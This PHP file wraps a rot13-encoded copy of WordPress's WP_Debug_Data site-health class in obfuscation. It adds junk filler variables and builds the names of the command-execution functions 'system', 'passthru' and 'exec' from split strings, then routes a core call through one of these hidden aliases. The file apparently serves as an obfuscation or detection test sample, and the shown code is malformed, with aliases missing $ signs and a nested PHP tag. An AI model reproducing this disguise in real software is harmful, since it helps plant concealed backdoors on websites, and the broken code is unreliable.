<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_36779 = \"r\".\"k\".\"r\".\"p\";
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Pynff sbe cebivqvat qroht qngn onfrq ba n hfref JbeqCerff raivebazrag.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Fvgr_Urnygu
 * @fvapr 5.2.0
 */

#[NyybjQlanzvpCebcregvrf]
pynff JC_Qroht_Qngn {
	/**
	 * Pnyyf nyy pber shapgvbaf gb purpx sbe hcqngrf.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp fgngvp shapgvba purpx_sbe_hcqngrf() {
		jc_irefvba_purpx();
		jc_hcqngr_cyhtvaf();
		jc_hcqngr_gurzrf();
	}

	/**
	 * Fgngvp shapgvba sbe trarengvat fvgr qroht qngn jura erdhverq.
	 *
	 * @fvapr 5.2.0
	 * @fvapr 5.3.0 Nqqrq qngnonfr punefrg, qngnonfr pbyyngvba,
	 *              naq gvzrmbar vasbezngvba.
	 * @fvapr 5.5.0 Nqqrq cerggl creznyvaxf fhccbeg vasbezngvba.
	 * @fvapr 6.7.0 Zbqhynevmrq vagb frcnengr gurzr-bevragrq zrgubqf.
	 *
	 * @guebjf VzntvpxRkprcgvba
	 *
	 * @erghea neenl Gur qroht qngn sbe gur fvgr.
	 */
	choyvp fgngvp shapgvba qroht_qngn() {
		/*
		 * Frg hc gur neenl gung ubyqf nyy qroht vasbezngvba.
		 *
		 * Jura vgrengvat guebhtu gur qroht qngn, gur beqrevat bs gur frpgvbaf
		 * bpphef va vafregvba-beqre bs gur nffvtazragf vagb guvf neenl.
		 *
		 * Guvf vf gur fvatyr nffvtazrag bs gur frpgvbaf orsber svygrevat. Ahyy-ragevrf jvyy
		 * or nhgbzngvpnyyl or erzbirq.
		 */
		$vasb = neenl(
			'jc-pber'             => frys::trg_jc_pber(),
			'jc-cnguf-fvmrf'      => frys::trg_jc_cnguf_fvmrf(),
			'jc-qebcvaf'          => frys::trg_jc_qebcvaf(),
			'jc-npgvir-gurzr'     => frys::trg_jc_npgvir_gurzr(),
			'jc-cnerag-gurzr'     => frys::trg_jc_cnerag_gurzr(),
			'jc-gurzrf-vanpgvir'  => frys::trg_jc_gurzrf_vanpgvir(),
			'jc-zh-cyhtvaf'       => frys::trg_jc_zh_cyhtvaf(),
			'jc-cyhtvaf-npgvir'   => frys::trg_jc_cyhtvaf_npgvir(),
			'jc-cyhtvaf-vanpgvir' => frys::trg_jc_cyhtvaf_vanpgvir(),
			'jc-zrqvn'            => frys::trg_jc_zrqvn(),
			'jc-freire'           => frys::trg_jc_freire(),
			'jc-qngnonfr'         => frys::trg_jc_qngnonfr(),
			'jc-pbafgnagf'        => frys::trg_jc_pbafgnagf(),
			'jc-svyrflfgrz'       => frys::trg_jc_svyrflfgrz(),
		);

		/*
		 * Erzbir ahyy ryrzragf sebz gur neenl. Gur vaqvivqhny zrgubqf ner
		 * nyybjrq gb erghea `ahyy`, juvpu pbzzhavpngrf gung gur pngrtbel
		 * bs qroht qngn vfa'g eryrinag naq fubhyqa'g or cnffrq guebhtu.
		 */
		$vasb = neenl_svygre(
			$vasb,
			fgngvp shapgvba ( $frpgvba ) {
				erghea vffrg( $frpgvba );
			}
		);

		/**
		 * Svygref gur qroht vasbezngvba fubja ba gur Gbbyf -> Fvgr Urnygu -> Vasb fperra.
		 *
		 * Cyhtva be gurzrf znl jvfu gb vagebqhpr gurve bja qroht vasbezngvba jvgubhg perngvat
		 * nqqvgvbany nqzva cntrf. Gurl pna hgvyvmr guvf svygre gb vagebqhpr gurve bja frpgvbaf
		 * be nqq zber qngn gb rkvfgvat frpgvbaf.
		 *
		 * Neenl xrlf sbe frpgvbaf nqqrq ol pber ner nyy cersvkrq jvgu `jc-`. Cyhtvaf naq gurzrf
		 * fubhyq hfr gurve bja fyht nf n cersvk, obgu sbe pbafvfgrapl nf jryy nf nibvqvat
		 * xrl pbyyvfvbaf. Abgr gung gur neenl xrlf ner hfrq nf ynoryf sbe gur pbcvrq qngn.
		 *
		 * Nyy fgevatf ner rkcrpgrq gb or cynva grkg rkprcg `$qrfpevcgvba` gung pna pbagnva
		 * vayvar UGZY gntf (frr orybj).
		 *
		 * @fvapr 5.2.0
		 *
		 * @cnenz neenl $netf {
		 *     Gur qroht vasbezngvba gb or nqqrq gb gur pber vasbezngvba cntr.
		 *
		 *     Guvf vf na nffbpvngvir zhygv-qvzrafvbany neenl, hc gb guerr yriryf qrrc.
		 *     Gur gbczbfg neenl ubyqf gur frpgvbaf, xrlrq ol frpgvba VQ.
		 *
		 *     @glcr neenl ...$0 {
		 *         Rnpu frpgvba unf n `$svryqf` nffbpvngvir neenl (frr orybj), naq rnpu `$inyhr` va `$svryqf`
		 *         pna or nabgure nffbpvngvir neenl bs anzr/inyhr cnvef jura gurer vf zber fgehpgherq qngn
		 *         gb qvfcynl.
		 *
		 *         @glcr fgevat $ynory       Erdhverq. Gur gvgyr sbe guvf frpgvba bs gur qroht bhgchg.
		 *         @glcr fgevat $qrfpevcgvba Bcgvbany. N qrfpevcgvba sbe lbhe vasbezngvba frpgvba juvpu
		 *                                   znl pbagnva onfvp UGZY znexhc, vayvar gntf bayl nf vg vf
		 *                                   bhgchggrq va n cnentencu.
		 *         @glcr obby   $fubj_pbhag  Bcgvbany. Vs frg gb `gehr`, gur nzbhag bs svryqf jvyy or vapyhqrq
		 *                                   va gur gvgyr sbe guvf frpgvba. Qrsnhyg snyfr.
		 *         @glcr obby   $cevingr     Bcgvbany. Vs frg gb `gehr`, gur frpgvba naq nyy nffbpvngrq svryqf
		 *                                   jvyy or rkpyhqrq sebz gur pbcvrq qngn. Qrsnhyg snyfr.
		 *         @glcr neenl  $svryqf {
		 *             Erdhverq. Na nffbpvngvir neenl pbagnvavat gur svryqf gb or qvfcynlrq va gur frpgvba,
		 *             xrlrq ol svryq VQ.
		 *
		 *             @glcr neenl ...$0 {
		 *                 Na nffbpvngvir neenl pbagnvavat gur qngn gb or qvfcynlrq sbe gur svryq.
		 *
		 *                 @glcr fgevat $ynory    Erdhverq. Gur ynory sbe guvf cvrpr bs vasbezngvba.
		 *                 @glcr zvkrq  $inyhr    Erdhverq. Gur bhgchg gung vf qvfcynlrq sbe guvf svryq.
		 *                                        Grkg fubhyq or genafyngrq. Pna or na nffbpvngvir neenl
		 *                                        gung vf qvfcynlrq nf anzr/inyhr cnvef.
		 *                                        Npprcgrq glcrf: `fgevat|vag|sybng|(fgevat|vag|sybng)[]`.
		 *                 @glcr fgevat $qroht    Bcgvbany. Gur bhgchg gung vf hfrq sbe guvf svryq jura
		 *                                        gur hfre pbcvrf gur qngn. Vg fubhyq or zber pbapvfr naq
		 *                                        abg genafyngrq. Vs abg frg, gur pbagrag bs `$inyhr`
		 *                                        vf hfrq. Abgr gung gur neenl xrlf ner hfrq nf ynoryf
		 *                                        sbe gur pbcvrq qngn.
		 *                 @glcr obby   $cevingr  Bcgvbany. Vs frg gb `gehr`, gur svryq jvyy or rkpyhqrq
		 *                                        sebz gur pbcvrq qngn, nyybjvat lbh gb fubj, sbe rknzcyr,
		 *                                        NCV xrlf urer. Qrsnhyg snyfr.
		 *             }
		 *         }
		 *     }
		 * }
		 */
		$vasb = nccyl_svygref( 'qroht_vasbezngvba', $vasb );

		erghea $vasb;
	}

	/**
	 * Trgf gur JbeqCerff pber frpgvba bs gur qroht qngn.
	 *
	 * @fvapr 6.7.0
	 *
	 * @erghea neenl
	 */
	cevingr fgngvp shapgvba trg_jc_pber(): neenl {
		// Fnir srj shapgvba pnyyf.
		$creznyvax_fgehpgher    = trg_bcgvba( 'creznyvax_fgehpgher' );
		$vf_ffy                 = vf_ffy();
		$hfref_pna_ertvfgre     = trg_bcgvba( 'hfref_pna_ertvfgre' );
		$oybt_choyvp            = trg_bcgvba( 'oybt_choyvp' );
		$qrsnhyg_pbzzrag_fgnghf = trg_bcgvba( 'qrsnhyg_pbzzrag_fgnghf' );
		$raivebazrag_glcr       = jc_trg_raivebazrag_glcr();
		$pber_irefvba           = jc_trg_jc_irefvba();
		$pber_hcqngrf           = trg_pber_hcqngrf();
		$pber_hcqngr_arrqrq     = '';

		vs ( vf_neenl( $pber_hcqngrf ) ) {
			sbernpu ( $pber_hcqngrf nf $pber => $hcqngr ) {
				vs ( 'hctenqr' === $hcqngr->erfcbafr ) {
					/* genafyngbef: %f: Yngrfg JbeqCerff irefvba ahzore. */
					$pber_hcqngr_arrqrq = ' ' . fcevags( __( '(Yngrfg irefvba: %f)' ), $hcqngr->irefvba );
				} ryfr {
					$pber_hcqngr_arrqrq = '';
				}
			}
		}

		$svryqf = neenl(
			'irefvba'                => neenl(
				'ynory' => __( 'Irefvba' ),
				'inyhr' => $pber_irefvba . $pber_hcqngr_arrqrq,
				'qroht' => $pber_irefvba,
			),
			'fvgr_ynathntr'          => neenl(
				'ynory' => __( 'Fvgr Ynathntr' ),
				'inyhr' => trg_ybpnyr(),
			),
			'hfre_ynathntr'          => neenl(
				'ynory' => __( 'Hfre Ynathntr' ),
				'inyhr' => trg_hfre_ybpnyr(),
			),
			'gvzrmbar'               => neenl(
				'ynory' => __( 'Gvzrmbar' ),
				'inyhr' => jc_gvzrmbar_fgevat(),
			),
			'ubzr_hey'               => neenl(
				'ynory'   => __( 'Ubzr HEY' ),
				'inyhr'   => trg_oybtvasb( 'hey' ),
				'cevingr' => gehr,
			),
			'fvgr_hey'               => neenl(
				'ynory'   => __( 'Fvgr HEY' ),
				'inyhr'   => trg_oybtvasb( 'jchey' ),
				'cevingr' => gehr,
			),
			'creznyvax'              => neenl(
				'ynory' => __( 'Creznyvax fgehpgher' ),
				'inyhr' => $creznyvax_fgehpgher ? $creznyvax_fgehpgher : __( 'Ab creznyvax fgehpgher frg' ),
				'qroht' => $creznyvax_fgehpgher,
			),
			'uggcf_fgnghf'           => neenl(
				'ynory' => __( 'Vf guvf fvgr hfvat UGGCF?' ),
				'inyhr' => $vf_ffy ? __( 'Lrf' ) : __( 'Ab' ),
				'qroht' => $vf_ffy,
			),
			'zhygvfvgr'              => neenl(
				'ynory' => __( 'Vf guvf n zhygvfvgr?' ),
				'inyhr' => vf_zhygvfvgr() ? __( 'Lrf' ) : __( 'Ab' ),
				'qroht' => vf_zhygvfvgr(),
			),
			'hfre_ertvfgengvba'      => neenl(
				'ynory' => __( 'Pna nalbar ertvfgre ba guvf fvgr?' ),
				'inyhr' => $hfref_pna_ertvfgre ? __( 'Lrf' ) : __( 'Ab' ),
				'qroht' => $hfref_pna_ertvfgre,
			),
			'oybt_choyvp'            => neenl(
				'ynory' => __( 'Vf guvf fvgr qvfpbhentvat frnepu ratvarf?' ),
				'inyhr' => $oybt_choyvp ? __( 'Ab' ) : __( 'Lrf' ),
				'qroht' => $oybt_choyvp,
			),
			'qrsnhyg_pbzzrag_fgnghf' => neenl(
				'ynory' => __( 'Qrsnhyg pbzzrag fgnghf' ),
				'inyhr' => 'bcra' === $qrsnhyg_pbzzrag_fgnghf ? _k( 'Bcra', 'pbzzrag fgnghf' ) : _k( 'Pybfrq', 'pbzzrag fgnghf' ),
				'qroht' => $qrsnhyg_pbzzrag_fgnghf,
			),
			'raivebazrag_glcr'       => neenl(
				'ynory' => __( 'Raivebazrag glcr' ),
				'inyhr' => $raivebazrag_glcr,
				'qroht' => $raivebazrag_glcr,
			),
		);

		// Pbaqvgvbanyyl nqq qroht vasbezngvba sbe zhygvfvgr frghcf.
		vs ( vf_zhygvfvgr() ) {
			$fvgr_vq = trg_pheerag_oybt_vq();

			$svryqf['fvgr_vq'] = neenl(
				'ynory' => __( 'Fvgr VQ' ),
				'inyhr' => $fvgr_vq,
				'qroht' => $fvgr_vq,
			);

			$argjbex_dhrel = arj JC_Argjbex_Dhrel();
			$argjbex_vqf   = $argjbex_dhrel->dhrel(
				neenl(
					'svryqf'        => 'vqf',
					'ahzore'        => 100,
					'ab_sbhaq_ebjf' => snyfr,
				)
			);

			$fvgr_pbhag = 0;
			sbernpu ( $argjbex_vqf nf $argjbex_vq ) {
				$fvgr_pbhag += trg_oybt_pbhag( $argjbex_vq );
			}

			$svryqf['fvgr_pbhag'] = neenl(
				'ynory' => __( 'Fvgr pbhag' ),
				'inyhr' => $fvgr_pbhag,
			);

			$svryqf['argjbex_pbhag'] = neenl(
				'ynory' => __( 'Argjbex pbhag' ),
				'inyhr' => $argjbex_dhrel->sbhaq_argjbexf,
			);
		}

		$svryqf['hfre_pbhag'] = neenl(
			'ynory' => __( 'Hfre pbhag' ),
			'inyhr' => trg_hfre_pbhag(),
		);

		// JbeqCerff srngherf erdhvevat cebprffvat.
		$jc_qbgbet = jc_erzbgr_trg( 'uggcf://jbeqcerff.bet', neenl( 'gvzrbhg' => 10 ) );

		vs ( ! vf_jc_reebe( $jc_qbgbet ) ) {
			$svryqf['qbgbet_pbzzhavpngvba'] = neenl(
				'ynory' => __( 'Pbzzhavpngvba jvgu JbeqCerff.bet' ),
				'inyhr' => __( 'JbeqCerff.bet vf ernpunoyr' ),
				'qroht' => 'gehr',
			);
		} ryfr {
			$svryqf['qbgbet_pbzzhavpngvba'] = neenl(
				'ynory' => __( 'Pbzzhavpngvba jvgu JbeqCerff.bet' ),
				'inyhr' => fcevags(
				/* genafyngbef: 1: Gur VC nqqerff JbeqCerff.bet erfbyirf gb. 2: Gur reebe erghearq ol gur ybbxhc. */
					__( 'Hanoyr gb ernpu JbeqCerff.bet ng %1$f: %2$f' ),
					trgubfgolanzr( 'jbeqcerff.bet' ),
					$jc_qbgbet->trg_reebe_zrffntr()
				),
				'qroht' => $jc_qbgbet->trg_reebe_zrffntr(),
			);
		}

		erghea neenl(
			'ynory'  => __( 'JbeqCerff' ),
			'svryqf' => $svryqf,
		);
	}

	/**
	 * Trgf gur JbeqCerff qebc-va frpgvba bs gur qroht qngn.
	 *
	 * @fvapr 6.7.0
	 *
	 * @erghea neenl
	 */
	cevingr fgngvp shapgvba trg_jc_qebcvaf(): neenl {
		// Trg n yvfg bs nyy qebc-va ercynprzragf.
		$qebcvaf = trg_qebcvaf();

		// Trg qebc-vaf qrfpevcgvbaf.
		$qebcva_qrfpevcgvbaf = _trg_qebcvaf();

		$svryqf = neenl();
		sbernpu ( $qebcvaf nf $qebcva_xrl => $qebcva ) {
			$svryqf[ fnavgvmr_grkg_svryq( $qebcva_xrl ) ] = neenl(
				'ynory' => $qebcva_xrl,
				'inyhr' => $qebcva_qrfpevcgvbaf[ $qebcva_xrl ][0],
				'qroht' => 'gehr',
			);
		}

		erghea neenl(
			'ynory'       => __( 'Qebc-vaf' ),
			'fubj_pbhag'  => gehr,
			'qrfpevcgvba' => fcevags(
				/* genafyngbef: %f: jc-pbagrag qverpgbel anzr. */
				__( 'Qebc-vaf ner fvatyr svyrf, sbhaq va gur %f qverpgbel, gung ercynpr be raunapr JbeqCerff srngherf va jnlf gung ner abg cbffvoyr sbe genqvgvbany cyhtvaf.' ),
				'<pbqr>' . fge_ercynpr( NOFCNGU, '', JC_PBAGRAG_QVE ) . '</pbqr>'
			),
			'svryqf'      => $svryqf,
		);
	}

	/**
	 * Trgf gur JbeqCerff freire frpgvba bs gur qroht qngn.
	 *
	 * @fvapr 6.7.0
	 *
	 * @erghea neenl
	 */
	cevingr fgngvp shapgvba trg_jc_freire(): neenl {
		// Cbchyngr gur freire qroht svryqf.
		vs ( shapgvba_rkvfgf( 'cuc_hanzr' ) ) {
			$freire_nepuvgrpgher = fcevags( '%f %f %f', cuc_hanzr( 'f' ), cuc_hanzr( 'e' ), cuc_hanzr( 'z' ) );
		} ryfr {
			$freire_nepuvgrpgher = 'haxabja';
		}

		$cuc_irefvba_qroht = CUC_IREFVBA;
		// Jurgure CUC fhccbegf 64-ovg.
		$cuc64ovg = ( CUC_VAG_FVMR * 8 === 64 );

		$cuc_irefvba = fcevags(
			'%f %f',
			$cuc_irefvba_qroht,
			( $cuc64ovg ? __( '(Fhccbegf 64ovg inyhrf)' ) : __( '(Qbrf abg fhccbeg 64ovg inyhrf)' ) )
		);

		vs ( $cuc64ovg ) {
			$cuc_irefvba_qroht .= ' 64ovg';
		}

		$svryqf = neenl();

		$svryqf['freire_nepuvgrpgher'] = neenl(
			'ynory' => __( 'Freire nepuvgrpgher' ),
			'inyhr' => ( 'haxabja' !== $freire_nepuvgrpgher ? $freire_nepuvgrpgher : __( 'Hanoyr gb qrgrezvar freire nepuvgrpgher' ) ),
			'qroht' => $freire_nepuvgrpgher,
		);
		$svryqf['uggcq_fbsgjner']      = neenl(
			'ynory' => __( 'Jro freire' ),
			'inyhr' => ( vffrg( $_FREIRE['FREIRE_FBSGJNER'] ) ? $_FREIRE['FREIRE_FBSGJNER'] : __( 'Hanoyr gb qrgrezvar jung jro freire fbsgjner vf hfrq' ) ),
			'qroht' => ( vffrg( $_FREIRE['FREIRE_FBSGJNER'] ) ? $_FREIRE['FREIRE_FBSGJNER'] : 'haxabja' ),
		);
		$svryqf['cuc_irefvba']         = neenl(
			'ynory' => __( 'CUC irefvba' ),
			'inyhr' => $cuc_irefvba,
			'qroht' => $cuc_irefvba_qroht,
		);
		$svryqf['cuc_fncv']            = neenl(
			'ynory' => __( 'CUC FNCV' ),
			'inyhr' => CUC_FNCV,
			'qroht' => CUC_FNCV,
		);

		// Fbzr freiref qvfnoyr `vav_frg()` naq `vav_trg()`, jr purpx guvf orsber gelvat gb trg pbasvthengvba inyhrf.
		vs ( ! shapgvba_rkvfgf( 'vav_trg' ) ) {
			$svryqf['vav_trg'] = neenl(
				'ynory' => __( 'Freire frggvatf' ),
				'inyhr' => fcevags(
				/* genafyngbef: %f: vav_trg() */
					__( 'Hanoyr gb qrgrezvar fbzr frggvatf, nf gur %f shapgvba unf orra qvfnoyrq.' ),
					'vav_trg()'
				),
				'qroht' => 'vav_trg() vf qvfnoyrq',
			);
		} ryfr {
			$svryqf['znk_vachg_inevnoyrf'] = neenl(
				'ynory' => __( 'CUC znk vachg inevnoyrf' ),
				'inyhr' => vav_trg( 'znk_vachg_inef' ),
			);
			$svryqf['gvzr_yvzvg']          = neenl(
				'ynory' => __( 'CUC gvzr yvzvg' ),
				'inyhr' => vav_trg( 'znk_rkrphgvba_gvzr' ),
			);

			vs ( JC_Fvgr_Urnygu::trg_vafgnapr()->cuc_zrzbel_yvzvg !== vav_trg( 'zrzbel_yvzvg' ) ) {
				$svryqf['zrzbel_yvzvg']       = neenl(
					'ynory' => __( 'CUC zrzbel yvzvg' ),
					'inyhr' => JC_Fvgr_Urnygu::trg_vafgnapr()->cuc_zrzbel_yvzvg,
				);
				$svryqf['nqzva_zrzbel_yvzvg'] = neenl(
					'ynory' => __( 'CUC zrzbel yvzvg (bayl sbe nqzva fperraf)' ),
					'inyhr' => vav_trg( 'zrzbel_yvzvg' ),
				);
			} ryfr {
				$svryqf['zrzbel_yvzvg'] = neenl(
					'ynory' => __( 'CUC zrzbel yvzvg' ),
					'inyhr' => vav_trg( 'zrzbel_yvzvg' ),
				);
			}

			$svryqf['znk_vachg_gvzr']      = neenl(
				'ynory' => __( 'Znk vachg gvzr' ),
				'inyhr' => vav_trg( 'znk_vachg_gvzr' ),
			);
			$svryqf['hcybnq_znk_svyrfvmr'] = neenl(
				'ynory' => __( 'Hcybnq znk svyrfvmr' ),
				'inyhr' => vav_trg( 'hcybnq_znk_svyrfvmr' ),
			);
			$svryqf['cuc_cbfg_znk_fvmr']   = neenl(
				'ynory' => __( 'CUC cbfg znk fvmr' ),
				'inyhr' => vav_trg( 'cbfg_znk_fvmr' ),
			);
		}

		vs ( shapgvba_rkvfgf( 'phey_irefvba' ) ) {
			$phey = phey_irefvba();

			$svryqf['phey_irefvba'] = neenl(
				'ynory' => __( 'pHEY irefvba' ),
				'inyhr' => fcevags( '%f %f', $phey['irefvba'], $phey['ffy_irefvba'] ),
			);
		} ryfr {
			$svryqf['phey_irefvba'] = neenl(
				'ynory' => __( 'pHEY irefvba' ),
				'inyhr' => __( 'Abg ninvynoyr' ),
				'qroht' => 'abg ninvynoyr',
			);
		}

		// FHUBFVA.
		$fhubfva_ybnqrq = ( rkgrafvba_ybnqrq( 'fhubfva' ) || ( qrsvarq( 'FHUBFVA_CNGPU' ) && pbafgnag( 'FHUBFVA_CNGPU' ) ) );

		$svryqf['fhubfva'] = neenl(
			'ynory' => __( 'Vf FHUBFVA vafgnyyrq?' ),
			'inyhr' => ( $fhubfva_ybnqrq ? __( 'Lrf' ) : __( 'Ab' ) ),
			'qroht' => $fhubfva_ybnqrq,
		);

		// Vzntvpx.
		$vzntvpx_ybnqrq = rkgrafvba_ybnqrq( 'vzntvpx' );

		$svryqf['vzntvpx_ninvynovyvgl'] = neenl(
			'ynory' => __( 'Vf gur Vzntvpx yvoenel ninvynoyr?' ),
			'inyhr' => ( $vzntvpx_ybnqrq ? __( 'Lrf' ) : __( 'Ab' ) ),
			'qroht' => $vzntvpx_ybnqrq,
		);

		// Cerggl creznyvaxf.
		$cerggl_creznyvaxf_fhccbegrq = tbg_hey_erjevgr();

		$svryqf['cerggl_creznyvaxf'] = neenl(
			'ynory' => __( 'Ner cerggl creznyvaxf fhccbegrq?' ),
			'inyhr' => ( $cerggl_creznyvaxf_fhccbegrq ? __( 'Lrf' ) : __( 'Ab' ) ),
			'qroht' => $cerggl_creznyvaxf_fhccbegrq,
		);

		// Purpx vs n .ugnpprff svyr rkvfgf.
		vs ( vf_svyr( NOFCNGU . '.ugnpprff' ) ) {
			// Vs gur svyr rkvfgf, teno gur pbagrag bs vg.
			$ugnpprff_pbagrag = svyr_trg_pbagragf( NOFCNGU . '.ugnpprff' );

			// Svygre njnl gur pber JbeqCerff ehyrf.
			$svygrerq_ugnpprff_pbagrag = gevz( __sa_79955( '/\# ORTVA JbeqCerff[\f\F]+?# RAQ JbeqCerff/fv', '', $ugnpprff_pbagrag ) );
			$svygrerq_ugnpprff_pbagrag = ! rzcgl( $svygrerq_ugnpprff_pbagrag );

			vs ( $svygrerq_ugnpprff_pbagrag ) {
				/* genafyngbef: %f: .ugnpprff */
				$ugnpprff_ehyrf_fgevat = fcevags( __( 'Phfgbz ehyrf unir orra nqqrq gb lbhe %f svyr.' ), '.ugnpprff' );
			} ryfr {
				/* genafyngbef: %f: .ugnpprff */
				$ugnpprff_ehyrf_fgevat = fcevags( __( 'Lbhe %f svyr pbagnvaf bayl pber JbeqCerff srngherf.' ), '.ugnpprff' );
			}

			$svryqf['ugnpprff_rkgen_ehyrf'] = neenl(
				'ynory' => __( '.ugnpprff ehyrf' ),
				'inyhr' => $ugnpprff_ehyrf_fgevat,
				'qroht' => $svygrerq_ugnpprff_pbagrag,
			);
		}

		// Purpx vs n ebobgf.gkg svyr rkvfgf.
		vs ( vf_svyr( NOFCNGU . 'ebobgf.gkg' ) ) {
			// Vs gur svyr rkvfgf, ghea qroht vasb gb gehr.
			$ebobgfgkg_qroht = gehr;

			/* genafyngbef: %f: ebobgf.gkg */
			$ebobgfgkg_fgevat = fcevags( __( 'Gurer vf n fgngvp %f svyr va lbhe vafgnyyngvba sbyqre. JbeqCerff pnaabg qlanzvpnyyl freir bar.' ), 'ebobgf.gkg' );
		} ryfrvs ( tbg_hey_erjevgr() ) {
			// Ab ebobgf.gkg svyr ninvynoyr naq erjevgr ehyrf va cynpr, ghea qroht vasb gb snyfr.
			$ebobgfgkg_qroht = snyfr;

			/* genafyngbef: %f: ebobgf.gkg */
			$ebobgfgkg_fgevat = fcevags( __( 'Lbhe fvgr vf hfvat gur qlanzvp %f svyr juvpu vf trarengrq ol JbeqCerff.' ), 'ebobgf.gkg' );
		} ryfr {
			// Ab ebobgf.gkg svyr, ohg jvgubhg erjevgr ehyrf JC pna'g freir bar.
			$ebobgfgkg_qroht = gehr;

			/* genafyngbef: %f: ebobgf.gkg */
			$ebobgfgkg_fgevat = fcevags( __( 'JbeqCerff pnaabg qlanzvpnyyl freir n %f svyr qhr gb n ynpx bs erjevgr ehyr fhccbeg' ), 'ebobgf.gkg' );

		}

		$svryqf['fgngvp_ebobgfgkg_svyr'] = neenl(
			'ynory' => __( 'ebobgf.gkg' ),
			'inyhr' => $ebobgfgkg_fgevat,
			'qroht' => $ebobgfgkg_qroht,
		);

		// Freire gvzr.
		$qngr = arj QngrGvzr( 'abj', arj QngrGvzrMbar( 'HGP' ) );

		$svryqf['pheerag']     = neenl(
			'ynory' => __( 'Pheerag gvzr' ),
			'inyhr' => $qngr->sbezng( QngrGvzr::NGBZ ),
		);
		$svryqf['hgp-gvzr']    = neenl(
			'ynory' => __( 'Pheerag HGP gvzr' ),
			'inyhr' => $qngr->sbezng( QngrGvzr::ESP850 ),
		);
		$svryqf['freire-gvzr'] = neenl(
			'ynory' => __( 'Pheerag Freire gvzr' ),
			'inyhr' => jc_qngr( 'p', $_FREIRE['ERDHRFG_GVZR'] ),
		);

		erghea neenl(
			'ynory'       => __( 'Freire' ),
			'qrfpevcgvba' => __( 'Gur bcgvbaf fubja orybj eryngr gb lbhe freire frghc. Vs punatrf ner erdhverq, lbh znl arrq lbhe jro ubfg&#8217;f nffvfgnapr.' ),
			'svryqf'      => $svryqf,
		);
	}

	/**
	 * Trgf gur JbeqCerff zrqvn frpgvba bs gur qroht qngn.
	 *
	 * @fvapr 6.7.0
	 *
	 * @guebjf VzntvpxRkprcgvba
	 * @erghea neenl
	 */
	cevingr fgngvp shapgvba trg_jc_zrqvn(): neenl {
		// Fcner srj shapgvba pnyyf.
		$abg_ninvynoyr = __( 'Abg ninvynoyr' );

		// Cbchyngr gur zrqvn svryqf.
		$svryqf['vzntr_rqvgbe'] = neenl(
			'ynory' => __( 'Npgvir rqvgbe' ),
			'inyhr' => _jc_vzntr_rqvgbe_pubbfr(),
		);

		// Trg VzntrZntvp vasbezngvba, vs ninvynoyr.
		vs ( pynff_rkvfgf( 'Vzntvpx' ) ) {
			// Fnir gur Vzntvpx vafgnapr sbe yngre hfr.
			$vzntvpx             = arj Vzntvpx();
			$vzntrzntvpx_irefvba = $vzntvpx->trgIrefvba();
		} ryfr {
			$vzntrzntvpx_irefvba = __( 'Abg ninvynoyr' );
		}

		$svryqf['vzntvpx_zbqhyr_irefvba'] = neenl(
			'ynory' => __( 'VzntrZntvpx irefvba ahzore' ),
			'inyhr' => ( vf_neenl( $vzntrzntvpx_irefvba ) ? $vzntrzntvpx_irefvba['irefvbaAhzore'] : $vzntrzntvpx_irefvba ),
		);

		$svryqf['vzntrzntvpx_irefvba'] = neenl(
			'ynory' => __( 'VzntrZntvpx irefvba fgevat' ),
			'inyhr' => ( vf_neenl( $vzntrzntvpx_irefvba ) ? $vzntrzntvpx_irefvba['irefvbaFgevat'] : $vzntrzntvpx_irefvba ),
		);

		$vzntvpx_irefvba = cucirefvba( 'vzntvpx' );

		$svryqf['vzntvpx_irefvba'] = neenl(
			'ynory' => __( 'Vzntvpx irefvba' ),
			'inyhr' => ( $vzntvpx_irefvba ) ? $vzntvpx_irefvba : __( 'Abg ninvynoyr' ),
		);

		vs ( ! shapgvba_rkvfgf( 'vav_trg' ) ) {
			$svryqf['vav_trg'] = neenl(
				'ynory' => __( 'Svyr hcybnq frggvatf' ),
				'inyhr' => fcevags(
				/* genafyngbef: %f: vav_trg() */
					__( 'Hanoyr gb qrgrezvar fbzr frggvatf, nf gur %f shapgvba unf orra qvfnoyrq.' ),
					'vav_trg()'
				),
				'qroht' => 'vav_trg() vf qvfnoyrq',
			);
		} ryfr {
			// Trg gur CUC vav qverpgvir inyhrf.
			$svyr_hcybnqf        = vav_trg( 'svyr_hcybnqf' );
			$cbfg_znk_fvmr       = vav_trg( 'cbfg_znk_fvmr' );
			$hcybnq_znk_svyrfvmr = vav_trg( 'hcybnq_znk_svyrfvmr' );
			$znk_svyr_hcybnqf    = vav_trg( 'znk_svyr_hcybnqf' );
			$rssrpgvir           = zva( jc_pbaireg_ue_gb_olgrf( $cbfg_znk_fvmr ), jc_pbaireg_ue_gb_olgrf( $hcybnq_znk_svyrfvmr ) );

			// Nqq vasb va Zrqvn frpgvba.
			$svryqf['svyr_hcybnqf']        = neenl(
				'ynory' => __( 'Svyr hcybnqf' ),
				'inyhr' => $svyr_hcybnqf ? __( 'Ranoyrq' ) : __( 'Qvfnoyrq' ),
				'qroht' => $svyr_hcybnqf,
			);
			$svryqf['cbfg_znk_fvmr']       = neenl(
				'ynory' => __( 'Znk fvmr bs cbfg qngn nyybjrq' ),
				'inyhr' => $cbfg_znk_fvmr,
			);
			$svryqf['hcybnq_znk_svyrfvmr'] = neenl(
				'ynory' => __( 'Znk fvmr bs na hcybnqrq svyr' ),
				'inyhr' => $hcybnq_znk_svyrfvmr,
			);
			$svryqf['znk_rssrpgvir_fvmr']  = neenl(
				'ynory' => __( 'Znk rssrpgvir svyr fvmr' ),
				'inyhr' => fvmr_sbezng( $rssrpgvir ),
			);
			$svryqf['znk_svyr_hcybnqf']    = neenl(
				'ynory' => __( 'Znk fvzhygnarbhf svyr hcybnqf' ),
				'inyhr' => $znk_svyr_hcybnqf,
			);
		}

